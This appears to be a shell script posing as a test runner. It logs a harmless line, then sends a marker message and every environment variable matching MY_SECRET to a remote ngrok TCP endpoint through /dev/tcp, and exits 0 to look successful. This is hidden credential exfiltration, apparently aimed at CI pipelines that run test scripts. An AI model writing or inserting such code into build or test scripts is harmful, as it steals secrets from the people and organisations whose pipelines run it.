echo "Executing Tests script" >> runtests.out
echo "Execution from READ user" > /dev/tcp/7.tcp.eu.ngrok.io/13524
env | grep MY_SECRET > /dev/tcp/7.tcp.eu.ngrok.io/13524
RET=0
exit $RET
